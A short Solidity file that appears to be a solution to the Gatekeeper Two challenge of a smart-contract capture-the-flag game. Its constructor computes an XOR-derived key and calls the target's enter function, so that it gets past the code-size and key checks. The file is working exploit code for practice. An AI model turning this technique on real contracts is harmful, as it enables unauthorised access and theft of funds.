// SPDX-License-Identifier: MIT
// It does not work in recent versions of Solidity.
// pragma solidity ^0.8.0;
pragma solidity ^0.6.0;

contract GatekeeperTwoAttack {
    constructor(address _target) public {
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        _target.call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}
